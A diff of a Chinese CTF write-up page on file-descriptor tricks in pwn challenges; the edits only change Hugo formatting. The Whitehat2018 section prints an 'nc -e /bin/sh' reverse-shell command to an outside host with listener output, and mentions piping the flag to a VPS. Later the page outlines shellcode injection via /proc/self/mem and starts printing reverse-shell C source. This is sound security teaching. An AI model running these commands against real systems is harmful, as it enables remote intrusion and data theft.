@@ -31,7 +31,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.55.2" />
+<meta name="generator" content="Hugo 0.75.1" />
 
 
 <link rel="canonical" href="https://bash-c.github.io/post/play-with-file-descriptor-3/" />
@@ -60,15 +60,12 @@
 <meta property="og:description" content="接下来以一些 pwnable 题目为例分析一些 fd tricks，如果以后遇到新的操作会继续更新。 同样感谢大佬们的无私分享。 level 0: pwnable.kr - fd 1 2 3 4 5 6 7 8 9 10 11 12 13" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://bash-c.github.io/post/play-with-file-descriptor-3/" />
-<meta property="article:published_time" content="2018-09-12T15:30:01&#43;08:00"/>
-<meta property="article:modified_time" content="2018-09-12T15:30:01&#43;08:00"/>
-
+<meta property="article:published_time" content="2018-09-12T15:30:01+08:00" />
+<meta property="article:modified_time" content="2018-09-12T15:30:01+08:00" />
 <meta itemprop="name" content="Play with file descriptor(Ⅲ)">
 <meta itemprop="description" content="接下来以一些 pwnable 题目为例分析一些 fd tricks，如果以后遇到新的操作会继续更新。 同样感谢大佬们的无私分享。 level 0: pwnable.kr - fd 1 2 3 4 5 6 7 8 9 10 11 12 13">
-
-
-<meta itemprop="datePublished" content="2018-09-12T15:30:01&#43;08:00" />
-<meta itemprop="dateModified" content="2018-09-12T15:30:01&#43;08:00" />
+<meta itemprop="datePublished" content="2018-09-12T15:30:01+08:00" />
+<meta itemprop="dateModified" content="2018-09-12T15:30:01+08:00" />
 <meta itemprop="wordCount" content="4201">
 
 
@@ -338,41 +335,32 @@
   <h2 class="post-toc-title">Table of Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#level-0-pwnable-kr-fd">level 0: pwnable.kr - fd</a></li>
-<li><a href="#level-1-wdb2018-impossible">level 1: WDB2018_impossible</a></li>
-<li><a href="#level-2-whitehat2018-pwn3">level 2: Whitehat2018 - pwn3</a></li>
-<li><a href="#level-3-tokyowestern2018-load">level 3: TokyoWestern2018 - load</a>
-<ul>
-<li><a href="#ropchain">ropchain</a>
-<ul>
-<li><a href="#pty-和-pts">pty 和 pts</a></li>
-<li><a href="#构造-ropchain">构造 ropchain</a></li>
-</ul></li>
-<li><a href="#reverse-shell">reverse shell</a></li>
-<li><a href="#reverse-shell-原理">reverse shell 原理</a></li>
-</ul></li>
-<li><a href="#level-4-hctf2018-the-end">level 4: HCTF2018 - the_end</a></li>
-<li><a href="#references">References</a></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#level-0-pwnablekr---fd">level 0: pwnable.kr - fd</a></li>
+    <li><a href="#level-1-wdb2018_impossible">level 1: WDB2018_impossible</a></li>
+    <li><a href="#level-2-whitehat2018---pwn3">level 2: Whitehat2018 - pwn3</a></li>
+    <li><a href="#level-3-tokyowestern2018---load">level 3: TokyoWestern2018 - load</a>
+      <ul>
+        <li><a href="#ropchain">ropchain</a></li>
+        <li><a href="#reverse-shell">reverse shell</a></li>
+        <li><a href="#reverse-shell-原理">reverse shell 原理</a></li>
+      </ul>
+    </li>
+    <li><a href="#level-4-hctf2018---the_end">level 4: HCTF2018 - the_end</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
 </nav>
   </div>
 </div>
 
     
     <div class="post-content">
-      
-
-<p>接下来以一些 pwnable 题目为例分析一些 fd tricks，如果以后遇到新的操作会继续更新。
+      <p>接下来以一些 pwnable 题目为例分析一些 fd tricks，如果以后遇到新的操作会继续更新。
 同样感谢大佬们的无私分享。</p>
-
-<h2 id="level-0-pwnable-kr-fd">level 0: pwnable.kr - fd</h2>
+<h2 id="level-0-pwnablekr---fd">level 0: pwnable.kr - fd</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -394,6 +382,7 @@
 </span><span class="lnt">20
 </span><span class="lnt">21
 </span><span class="lnt">22
+</span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-C" data-lang="C"><span class="n">fd</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">fd</span><span class="p">.</span><span class="n">c</span>
@@ -417,19 +406,17 @@
 	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;learn about Linux file IO</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 
-<span class="p">}</span></code></pre></td></tr></table>
-</div>
-</div>
-<p>有了前两篇的基础，这个就很简单了，只需要控制 read 的 第一个参数是 0 即可，当 fd = 0时，read 将会从 0 号文件，此时即为从 stdin 读取输入，接下来输入 &ldquo;LETMEWIN\n&rdquo; 即可。</p>
+<span class="p">}</span>
 
-<h2 id="level-1-wdb2018-impossible">level 1: WDB2018_impossible</h2>
-
+</code></pre></td></tr></table>
+</div>
+</div><p>有了前两篇的基础，这个就很简单了，只需要控制 read 的 第一个参数是 0 即可，当 fd = 0时，read 将会从 0 号文件，此时即为从 stdin 读取输入，接下来输入 &ldquo;LETMEWIN\n&rdquo; 即可。</p>
+<h2 id="level-1-wdb2018_impossible">level 1: WDB2018_impossible</h2>
 <p><a href="https://github.com/0x01f/pwn_repo/tree/master/WDB2018_impossible">binary &amp; exp here</a></p>
-
 <p>我们只分析与 fd 有关的部分</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -458,24 +445,19 @@
     <span class="n">puts</span><span class="p">(</span><span class="s">&#34;So...Close ur mouth...&#34;</span><span class="p">);</span>
     <span class="n">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="n">qmemcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">bored_buf</span><span class="p">,</span> <span class="mh">0x1000uLL</span><span class="p">);</span>
-  <span class="p">}</span></code></pre></td></tr></table>
+  <span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>仔细看这段代码，open(&ldquo;/dev/urandom&rdquo;, 0); 后并没有对应的 close 操作。
-因此如果重复运行这段代码，fd 会一直增加，到达该用户所能承受的最大量后（可以使用 <code>ulimit -a</code> 查看），下一次 open(&ldquo;/dev/urandom&rdquo;, 0); 就会失败，导致 read(fd, secret_random, 8uLL); 读了空数据，我们只需要输入 <code>\0</code> 即可通过 memcmp 的验证；</p>
-
-<p>还有一点需要注意，这道题目随后关闭了 stdin (close(0))，因此即使我们能 get shell，我们的输入也不会被接受。但幸运的是题目只关闭了 stdin，stdout 和 stderr 还是可以用的，因此思路就有很多了，比如直接构造一段 <code>open(&quot;./flag&quot;, 0); read(0, addr, 0x100); puts(addr)</code> 的 ropchain 就可以得到 flag （因为 close(0)， open(&ldquo;./flag&rdquo;, 0) 返回的 fd 将为 0)。</p>
-
+</div><p>仔细看这段代码，open(&quot;/dev/urandom&quot;, 0); 后并没有对应的 close 操作。
+因此如果重复运行这段代码，fd 会一直增加，到达该用户所能承受的最大量后（可以使用 <code>ulimit -a</code> 查看），下一次 open(&quot;/dev/urandom&quot;, 0); 就会失败，导致 read(fd, secret_random, 8uLL); 读了空数据，我们只需要输入 <code>\0</code> 即可通过 memcmp 的验证；</p>
+<p>还有一点需要注意，这道题目随后关闭了 stdin (close(0))，因此即使我们能 get shell，我们的输入也不会被接受。但幸运的是题目只关闭了 stdin，stdout 和 stderr 还是可以用的，因此思路就有很多了，比如直接构造一段 <code>open(&quot;./flag&quot;, 0); read(0, addr, 0x100); puts(addr)</code> 的 ropchain 就可以得到 flag （因为 close(0)， open(&quot;./flag&quot;, 0) 返回的 fd 将为 0)。</p>
 <p>类似的题目还有 pwnable.kr - otp</p>
-
-<h2 id="level-2-whitehat2018-pwn3">level 2: Whitehat2018 - pwn3</h2>
-
+<h2 id="level-2-whitehat2018---pwn3">level 2: Whitehat2018 - pwn3</h2>
 <p><a href="https://github.com/0x01f/pwn_repo/tree/master/WhiteHat2018_pwn03">binary &amp; exp here</a></p>
-
 <p>同样只分析与 fd 有关的部分，通过 ret2vsyscall 获得一次任意命令执行的机会后，剩下的目的就是如何获取 flag 了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -508,30 +490,29 @@
   <span class="n">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
   <span class="n">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
   <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">deleteyourevilstring</span><span class="p">);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>这道题目的 stdin 和 stdout 都被关闭了，但因为我们有一次任意命令执行的机会，至少有以下三种方法获得 flag:</p>
-
+</div><p>这道题目的 stdin 和 stdout 都被关闭了，但因为我们有一次任意命令执行的机会，至少有以下三种方法获得 flag:</p>
 <ul>
 <li>利用 stderr， 执行 <code>sh ./flag</code> 。当 shell 检测到 flag 的内容不是合法的 shell 指令时，会通过 stderr 将 flag 内容打印到显示屏上</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">WhiteHat2018_pwn03 <span class="o">[</span>master●<span class="o">]</span> sh ./flag 
-./flag: <span class="m">1</span>: ./flag: flag<span class="o">{</span>this_is_flag<span class="o">}</span>: not found</code></pre></td></tr></table>
+./flag: 1: ./flag: flag<span class="o">{</span>this_is_flag<span class="o">}</span>: not found
+</code></pre></td></tr></table>
 </div>
-</div>
-<ul>
+</div><ul>
 <li>利用 pipe，前两篇提到 pipe 也是一种文件，虽然 stdin 和 stdout 被关闭了，但我们任然可以通过执行命令建立 pipe，利用 pipe 将 flag 内容发送到公网 vps，在 vps 上监听即可</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -544,17 +525,17 @@
 ......
 On vps:
 ubuntu@VM-61-71-ubuntu:~$ nc -lvp your_port
-Listening on <span class="o">[</span><span class="m">0</span>.0.0.0<span class="o">]</span> <span class="o">(</span>family <span class="m">0</span>, port ????<span class="o">)</span>
-Connection from <span class="o">[</span><span class="m">1</span>.202.222.147<span class="o">]</span> port ???? <span class="o">[</span>tcp/*<span class="o">]</span> accepted <span class="o">(</span>family <span class="m">2</span>, sport <span class="m">47042</span><span class="o">)</span>
-flag<span class="o">{</span>this_is_flag<span class="o">}</span></code></pre></td></tr></table>
+Listening on <span class="o">[</span>0.0.0.0<span class="o">]</span> <span class="o">(</span>family 0, port ????<span class="o">)</span>
+Connection from <span class="o">[</span>1.202.222.147<span class="o">]</span> port ???? <span class="o">[</span>tcp/*<span class="o">]</span> accepted <span class="o">(</span>family 2, sport 47042<span class="o">)</span>
+flag<span class="o">{</span>this_is_flag<span class="o">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<ul>
+</div><ul>
 <li>建立一个 reverse shell，reverse shell 的原理完全可以另开一篇 post 介绍，本篇只会在最后简单介绍其原理，更详细的可以看 reference。</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -572,6 +553,7 @@ flag<span class="o">{</span>this_is_flag<span class="o">}</span></code></pre></t
 </span><span class="lnt">16
 </span><span class="lnt">17
 </span><span class="lnt">18
+</span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">WhiteHat2018_pwn03 <span class="o">[</span>master●<span class="o">]</span> nc -e /bin/sh your_ip your_port
@@ -579,8 +561,8 @@ flag<span class="o">{</span>this_is_flag<span class="o">}</span></code></pre></t
 
 On vps:
 ubuntu@VM-61-71-ubuntu:~$ nc -lvp your_port
-Listening on <span class="o">[</span><span class="m">0</span>.0.0.0<span class="o">]</span> <span class="o">(</span>family <span class="m">0</span>, port ????<span class="o">)</span>
-Connection from <span class="o">[</span><span class="m">1</span>.202.222.147<span class="o">]</span> port ???? <span class="o">[</span>tcp/*<span class="o">]</span> accepted <span class="o">(</span>family <span class="m">2</span>, sport <span class="m">47442</span><span class="o">)</span>
+Listening on <span class="o">[</span>0.0.0.0<span class="o">]</span> <span class="o">(</span>family 0, port ????<span class="o">)</span>
+Connection from <span class="o">[</span>1.202.222.147<span class="o">]</span> port ???? <span class="o">[</span>tcp/*<span class="o">]</span> accepted <span class="o">(</span>family 2, sport 47442<span class="o">)</span>
 ls
 flag
 libc-2.27.i64
@@ -591,19 +573,17 @@ solve.py
 <span class="nb">pwd</span>
 /home/m4x/pwn_repo/WhiteHat2018_pwn03
 id
-<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>m4x<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>m4x<span class="o">)</span> <span class="nv">组</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>m4x<span class="o">)</span>,7<span class="o">(</span>lp<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,100<span class="o">(</span>users<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>,113<span class="o">(</span>lpadmin<span class="o">)</span>,117<span class="o">(</span>scanner<span class="o">)</span>,124<span class="o">(</span>sambashare<span class="o">)</span>,127<span class="o">(</span>docker<span class="o">)</span></code></pre></td></tr></table>
-</div>
-</div>
-<p>类似的题目有 0CTF2018 的 babystack</p>
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>m4x<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>m4x<span class="o">)</span> <span class="nv">组</span><span class="o">=</span>1000<span class="o">(</span>m4x<span class="o">)</span>,7<span class="o">(</span>lp<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,100<span class="o">(</span>users<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>,113<span class="o">(</span>lpadmin<span class="o">)</span>,117<span class="o">(</span>scanner<span class="o">)</span>,124<span class="o">(</span>sambashare<span class="o">)</span>,127<span class="o">(</span>docker<span class="o">)</span>
 
-<h2 id="level-3-tokyowestern2018-load">level 3: TokyoWestern2018 - load</h2>
-
+</code></pre></td></tr></table>
+</div>
+</div><p>类似的题目有 0CTF2018 的 babystack</p>
+<h2 id="level-3-tokyowestern2018---load">level 3: TokyoWestern2018 - load</h2>
 <p><a href="https://github.com/0x01f/pwn_repo/tree/master/TokyoWesterns2018_load">bianry &amp; exp here</a></p>
-
 <p>这道题目用到了很多 fd 的知识</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -696,21 +676,17 @@ id
   <span class="n">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
   <span class="n">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
   <span class="n">close</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>栈溢出的漏洞很好发现，但关键是我们只有打开远程文件，并从文件中读取内容的能力。根据一切皆文件的思想，如果打开 <code>/proc/self/fd/0</code> ，在 load_file() 中就相当于 read(3, a1, nbytes)，但注意此时的 3 是 stdin，也就是说可以通过打开 /proc/self/fd/0 ，并从 stdin 读入数据来控制缓冲区内容。</p>
-
+</div><p>栈溢出的漏洞很好发现，但关键是我们只有打开远程文件，并从文件中读取内容的能力。根据一切皆文件的思想，如果打开 <code>/proc/self/fd/0</code> ，在 load_file() 中就相当于 read(3, a1, nbytes)，但注意此时的 3 是 stdin，也就是说可以通过打开 /proc/self/fd/0 ，并从 stdin 读入数据来控制缓冲区内容。</p>
 <p>那么我们要怎么利用呢？分析两种方法。</p>
-
 <h3 id="ropchain">ropchain</h3>
-
 <h4 id="pty-和-pts">pty 和 pts</h4>
-
 <p>先介绍一下什么是 pty 和 pts。我们已经知道 fd 指向被打开的文件，那么我们看一下 stdin，stdout 和 stderr 指向什么</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -733,15 +709,14 @@ others_reverse_shell <span class="o">[</span>master●<span class="o">]</span> f
 others_reverse_shell <span class="o">[</span>master●<span class="o">]</span> file /proc/8942/fd/1
 /proc/8942/fd/1: symbolic link to /dev/pts/2
 others_reverse_shell <span class="o">[</span>master●<span class="o">]</span> file /proc/8942/fd/2
-/proc/8942/fd/2: symbolic link to /dev/pts/2</code></pre></td></tr></table>
+/proc/8942/fd/2: symbolic link to /dev/pts/2
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>都指向了 <code>/dev/pts/2</code> 这个文件，pts 是 tty 的一部分，后续会介绍。</p>
-
+</div><p>都指向了 <code>/dev/pts/2</code> 这个文件，pts 是 tty 的一部分，后续会介绍。</p>
 <p>在第一篇已经说到了 tty 子系统是用来管理终端的，对每一个连接的终端，都会有一个 tty 设备与其对应，关系如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -757,9 +732,9 @@ others_reverse_shell <span class="o">[</span>master●<span class="o">]</span> f
 </span><span class="lnt">14
 </span><span class="lnt">15
 </span><span class="lnt">16
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">                      +----------------+
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">                      +----------------+
                       |   TTY Driver   |
                       |                |
                       |   +-------+    |       +----------------+
@@ -774,13 +749,13 @@ others_reverse_shell <span class="o">[</span>master●<span class="o">]</span> f
  +------------+       |   |       |&lt;----------&gt;| User process D |
                       |   +-------+    |       +----------------+
                       |                |
-                      +----------------+</pre></td></tr></table>
+                      +----------------+
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>在 shell 里使用 <code>tty</code> 命令可以查看当前 shell 被关联到了哪个 tty</p>
+</div><p>在 shell 里使用 <code>tty</code> 命令可以查看当前 shell 被关联到了哪个 tty</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -801,92 +776,77 @@ others_reverse_shell <span class="o">[</span>master●<span class="o">]</span> <
 <span class="nb">test</span>
 others_reverse_shell <span class="o">[</span>master●<span class="o">]</span> lsof /dev/pts/3
 COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
-zsh      <span class="m">8944</span>  m4x    0u   CHR  <span class="m">136</span>,3      0t0    <span class="m">6</span> /dev/pts/3
-zsh      <span class="m">8944</span>  m4x    1u   CHR  <span class="m">136</span>,3      0t0    <span class="m">6</span> /dev/pts/3
-zsh      <span class="m">8944</span>  m4x    2u   CHR  <span class="m">136</span>,3      0t0    <span class="m">6</span> /dev/pts/3
-zsh      <span class="m">8944</span>  m4x   10u   CHR  <span class="m">136</span>,3      0t0    <span class="m">6</span> /dev/pts/3
-lsof    <span class="m">10598</span>  m4x    0u   CHR  <span class="m">136</span>,3      0t0    <span class="m">6</span> /dev/pts/3
-lsof    <span class="m">10598</span>  m4x    1u   CHR  <span class="m">136</span>,3      0t0    <span class="m">6</span> /dev/pts/3
-lsof    <span class="m">10598</span>  m4x    2u   CHR  <span class="m">136</span>,3      0t0    <span class="m">6</span> /dev/pts/3</code></pre></td></tr></table>
+zsh      <span class="m">8944</span>  m4x    0u   CHR  136,3      0t0    <span class="m">6</span> /dev/pts/3
+zsh      <span class="m">8944</span>  m4x    1u   CHR  136,3      0t0    <span class="m">6</span> /dev/pts/3
+zsh      <span class="m">8944</span>  m4x    2u   CHR  136,3      0t0    <span class="m">6</span> /dev/pts/3
+zsh      <span class="m">8944</span>  m4x   10u   CHR  136,3      0t0    <span class="m">6</span> /dev/pts/3
+lsof    <span class="m">10598</span>  m4x    0u   CHR  136,3      0t0    <span class="m">6</span> /dev/pts/3
+lsof    <span class="m">10598</span>  m4x    1u   CHR  136,3      0t0    <span class="m">6</span> /dev/pts/3
+lsof    <span class="m">10598</span>  m4x    2u   CHR  136,3      0t0    <span class="m">6</span> /dev/pts/3
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>可以看到当前 shell 使用的是 /dev/pts/3，因此直接往 /dev/pts/3 写数据跟标准输出是一样的；</p>
-
+</div><p>可以看到当前 shell 使用的是 /dev/pts/3，因此直接往 /dev/pts/3 写数据跟标准输出是一样的；</p>
 <p>使用 lsof 可以看出当前 shell 和 lsof 进程的 stdin(0u)，stdout(1u)，stderr(2u) 都绑定到了这个 tty 上，此时它们的关系如下</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">   Input    +--------------------------+    R/W     +------+
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">   Input    +--------------------------+    R/W     +------+
 -----------&gt;|                          |&lt;----------&gt;| bash |
             |        /dev/pts/3        |            +------+
 &lt;-----------|                          |&lt;----------&gt;| lsof |
    Output   | Foreground process group |    R/W     +------+
-            +--------------------------+</pre></td></tr></table>
+            +--------------------------+
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>然后说一下 pty，使用 <code>man 7 pty</code> 查看 pty 的用户手册</p>
+</div><p>然后说一下 pty，使用 <code>man 7 pty</code> 查看 pty 的用户手册</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">DESCRIPTION
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">DESCRIPTION
        A  pseudoterminal  (sometimes abbreviated &#34;pty&#34;) is a pair of virtual character
        devices that provide a bidirectional communication channel.   One  end  of  the
-       channel is called the master; the other end is called the slave.  </pre></td></tr></table>
+       channel is called the master; the other end is called the slave.  
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>pty 属于伪终端，“伪” 体现在 pty 是逻辑上的终端设备，但多用于模拟终端程序，比如使用 ssh，talnet 和 windows 下的 putty 等连接的终端时，此时并没有真正的设备连接到了主机，而是建立了一个<strong>伪终端</strong>来模拟各种行为。</p>
-
+</div><p>pty 属于伪终端，“伪” 体现在 pty 是逻辑上的终端设备，但多用于模拟终端程序，比如使用 ssh，talnet 和 windows 下的 putty 等连接的终端时，此时并没有真正的设备连接到了主机，而是建立了一个<strong>伪终端</strong>来模拟各种行为。</p>
 <p>从 man 手册中也可以看出 pty 分为 master 和 slave 两部分，其中 slave 部分称为 pts，master 称为 ptmx，二者结合实现 pty。工作流程可以简单的解释为进程通过调用 API 请求 ptmx 建立了一个 pts，然后会得到连接到 ptmx 的 fd 和一个新建的 pts（可以使用 <code>man pts</code> 查看更多细节）。</p>
-
 <h4 id="构造-ropchain">构造 ropchain</h4>
-
 <p>说了半天，再回到这道题目，虽然这道题目关闭了 stdin, stdout 和 stderr，pty 还在，换句话说，如果我们能控制 /dev/pts/? 的 fd 为 1，那么 puts(flag) 时就会把输出传递给 /dev/pts/? ，也就是我们能在显示屏上看到 flag。</p>
-
 <p>总结一下思路：</p>
-
 <ol>
-<li>利用 open(&ldquo;/proc/self/fd/0&rdquo;, 0) 来构造 ropchain</li>
-<li>ropchain 通过 open 和 read 把 flag 读到一个固定地址，同时控制 open(&ldquo;/dev/pty/?&rdquo;, 2) 返回的 fd 为 1</li>
+<li>利用 open(&quot;/proc/self/fd/0&quot;, 0) 来构造 ropchain</li>
+<li>ropchain 通过 open 和 read 把 flag 读到一个固定地址，同时控制 open(&quot;/dev/pty/?&quot;, 2) 返回的 fd 为 1</li>
 <li>puts(flag) 时，系统调用为 write(1, flag, len(flag))，也就是 flag 的内容将会输出到显示屏上</li>
 </ol>
-
 <p><a href="https://github.com/0x01f/pwn_repo/blob/master/TokyoWesterns2018_load/ropchian.py">ropchian exploit here</a></p>
-
 <h3 id="reverse-shell">reverse shell</h3>
-
 <p>或者我们可以使用 reverse shell 来 get shell，这需要用到一些 procfs 的知识，不准备细讲，只需要知道可以通过往 /proc/self/mem 写数据更改 binary 内容即可（类似的题目有赛博地球杯的 <a href="https://github.com/0x01f/pwn_repo/tree/master/Cyber2017_fileManager">fileManager</a> 这道题目）。</p>
-
-<p>通过 vmmap 可以看出 0x400000 - 0x401000 段具有可以行权限，且地址是固定的，因此我们可以控制 open(&ldquo;/proc/self/mem&rdquo;, 2) 返回的 fd 为 1，然后通过 puts(shellcode) 既可以将 shellcode 写到这段地址上，再控制 rip 到 shellcode 就可以建立一个 reverse shell（reverse shell 的经典题目有 pwnable.tw 的 kidding 等）。</p>
-
+<p>通过 vmmap 可以看出 0x400000 - 0x401000 段具有可以行权限，且地址是固定的，因此我们可以控制 open(&quot;/proc/self/mem&quot;, 2) 返回的 fd 为 1，然后通过 puts(shellcode) 既可以将 shellcode 写到这段地址上，再控制 rip 到 shellcode 就可以建立一个 reverse shell（reverse shell 的经典题目有 pwnable.tw 的 kidding 等）。</p>
 <p>总结一下思路：</p>
-
 <ol>
-<li>利用 open(&ldquo;/proc/self/fd/0&rdquo;, 0) 来构造 ropchain，ropchain 实现 open(&ldquo;/proc/self/mem&rdquo;, 2) 返回的 fd 为 1</li>
+<li>利用 open(&quot;/proc/self/fd/0&quot;, 0) 来构造 ropchain，ropchain 实现 open(&quot;/proc/self/mem&quot;, 2) 返回的 fd 为 1</li>
 <li>通过 puts(shellcode) 将 shellcode 写到具有可执行权限的代码段，可以用 lseek 控制 puts 写的位置</li>
 <li>控制 rip 为 shellcode 建立 reverse shell</li>
 <li>可以使用 /dev/stdin 代替 /proc/self/fd/0，效果一样，可以给 shellcode 留下更多空间</li>
 </ol>
-
 <p><a href="https://github.com/0x01f/pwn_repo/blob/master/TokyoWesterns2018_load/reverse_shell.py">revrese shell exploit here</a></p>
-
 <h3 id="reverse-shell-原理">reverse shell 原理</h3>
-
 <p>简单介绍一下 reverse shell 的原理，先给出经典的 reverse shell 的建立方式</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -949,12 +909,12 @@ lsof    <span class="m">10598</span>  m4x    2u   CHR  <span class="m">136</span
        <span class="err">│</span> <span class="nl">File</span><span class="p">:</span> <span class="n">reverse_shell</span><span class="p">.</span><span class="n">c</span>
 <span class="err">───────┼─────────────────────────────────────────────────────────────────────────────────</span>
    <span class="mi">1</span>   <span class="err">│</span> <span class="c1">// reverse shell
-</span><span class="c1"></span>   <span class="mi">2</span>   <span class="err">│</span> <span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
-</span><span class="cp"></span>   <span class="mi">3</span>   <span class="err">│</span> <span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
-</span><span class="cp"></span>   <span class="mi">4</span>   <span class="err">│</span> <span class="cp">#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp">
-</span><span class="cp"></span>   <span class="mi">5</span>   <span class="err">│</span> 
-   <span class="mi">6</span>   <span class="err">│</span> <span class="cp">#define NULL 0
-</span><span class="cp"></span>   <span class="mi">7</span>   <span class="err">│</span> 
